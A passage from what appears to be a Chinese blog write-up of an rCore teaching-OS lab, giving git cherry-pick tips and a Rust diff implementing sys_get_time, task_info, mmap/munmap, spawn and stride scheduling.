<code>suspend_current_and_run_next</code> 将当前进程放入就绪队列中，并重新进行调度。</p><h3 id="前向兼容"><a href="#前向兼容" class="headerlink" title="前向兼容"></a>前向兼容</h3><p>从本实验开始，内核必须前向兼容，能够通过前一章的所有测试用例。根据文档提示，可以采用 <code>git cherry-pick</code> 系列命令，将其他分支的 commit 移植到本章分支。使用方法如下：</p><ol><li>合并特定的 commit 到当前分支：<code>git cherry-pick &lt;commit id&gt;</code>。</li><li>若遇到冲突，首先打开冲突文件，如：<code>os/src/syscall/process.rs</code>，编辑文件，解决冲突。</li><li>冲突解决后，标记已解决冲突的文件：<code>git add os/src/syscall/process.rs</code>。重复 2、3 步骤，直至解决完所有的冲突。</li><li>继续 <code>cherry-pick</code> 过程：<code>git cherry-pick --continue</code>。</li></ol><p>这一章由于涉及到任务到进程的转变，框架改动较大，且前面章节修改的代码也不算多，因此我最终还是选择了手动移植。但在后面章节的实验中还是建议使用 cherry-pick.</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/config.rs b/os/src/config.rsindex 5761cdd..b836e56 100644<span class="token coord">--- a/os/src/config.rs</span><span class="token coord">+++ b/os/src/config.rs</span>@@ -23,3 +23,5 @@ pub const TRAP_CONTEXT_BASE: usize = TRAMPOLINE - PAGE_SIZE;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub const CLOCK_FREQ: usize = 12500000;</span><span class="token prefix unchanged"> </span><span class="token line">/// the physical memory end</span><span class="token prefix unchanged"> </span><span class="token line">pub const MEMORY_END: usize = 0x88000000;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// big constant for process scheduling</span><span class="token prefix inserted">+</span><span class="token line">pub const BIG_STRIDE: isize = 1000_000;</span></span>\ No newline at end of filediff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -1,7 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Implementation of [`FrameAllocator`] which</span><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(v);</span><span class="token prefix unchanged"> </span><span class="token line">    println!("frame_allocator_test passed!");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex c3d15f3..dca8551 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -60,6 +60,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// remove a area</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some((idx, area)) = self</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d216861..8ff9c7b 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -11,9 +11,9 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix deleted">-</span><span class="token line">use address::&#123;StepByOne, VPNRange&#125;;</span><span class="token prefix deleted">-</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use address::StepByOne;</span><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use page_table::&#123;translated_byte_buffer, translated_refmut, translated_str, PageTableEntry&#125;;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 8e0a7dd..ba663a1 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -45,8 +45,11 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::current_task;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_READ => sys_read(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f7aa9c3..13b9abb 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,14 +1,16 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    loader::get_app_data_by_name,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;is_mem_sufficient, translated_byte_buffer, translated_refmut, translated_str, VirtAddr&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next,</span><span class="token prefix deleted">-</span><span class="token line">        suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: current_task().unwrap().get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: current_task().unwrap().get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(_len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().mmap(start_va, end_va, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().munmap(start_va, end_va)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span></span>@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: fork + exec =/= spawn</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_spawn(_path: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    // spawn a new process based upon _path</span><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _path = translated_str(token, _path);</span><span class="token prefix inserted">+</span><span class="token line">    let data_opt = get_app_data_by_name(_path.as_str());</span><span class="token prefix inserted">+</span><span class="token line">    if data_opt.is_none() &#123;  // invalid file name</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let new_task = current_task.spawn(data_opt.unwrap());</span><span class="token prefix inserted">+</span><span class="token line">    let new_pid = new_task.getpid();</span><span class="token prefix inserted">+</span><span class="token line">    add_task(new_task);</span><span class="token prefix inserted">+</span><span class="token line">    new_pid as isize</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Set task priority.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_set_priority(_prio: isize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if _prio &lt;= 1 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    current_task.set_prio(_prio);</span><span class="token prefix inserted">+</span><span class="token line">    _prio</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644<span class="token coord">--- a/os/src/task/manager.rs</span><span class="token coord">+++ b/os/src/task/manager.rs</span>@@ -19,11 +19,27 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Add process back to ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock>) &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        task.inc_stride();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.ready_queue.push_back(task);</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Take a process out of the ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn fetch(&amp;mut self) -> Option&lt;Arc&lt;TaskControlBlock>> &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        self.ready_queue.pop_front()</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        // self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        let mut min_stride = isize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        let mut best_idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for (idx, tcb) in self.ready_queue.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let stride = tcb.get_stride();</span><span class="token prefix inserted">+</span><span class="token line">            if min_stride > stride &#123;</span><span class="token prefix inserted">+</span><span class="token line">                min_stride = stride;</span><span class="token prefix inserted">+</span><span class="token line">                best_idx = idx;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        if min_stride == isize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            None</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.swap(0, best_idx);</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644<span class="token coord">--- a/os/src/task/processor.rs</span><span class="token coord">+++ b/os/src/task/processor.rs</span>@@ -8,6 +8,7 @@ use super::__switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;fetch_task, TaskStatus&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;TaskContext, TaskControlBlock&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            task_inner.task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if task_inner.time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            // release coming task_inner manually</span><span class="token prefix unchanged"> </span><span class="token line">            drop(task_inner);</span><span class="token prefix unchanged"> </span><span class="token line">            // release coming task TCB manually</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 1402c31..e60021d 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,9 +1,10 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management &amp; Functions for completely changing TCB</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span><span class="token prefix deleted">-</span><span class="token line">use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::&#123;trap_handler, TrapContext&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span></span>@@ -34,6 +35,86 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">        inner.memory_set.token()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Set the schduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.set_prio(prio);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get the schduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_stride(&amp;self) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.stride</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase the stride by pass</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.inc_stride();</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn 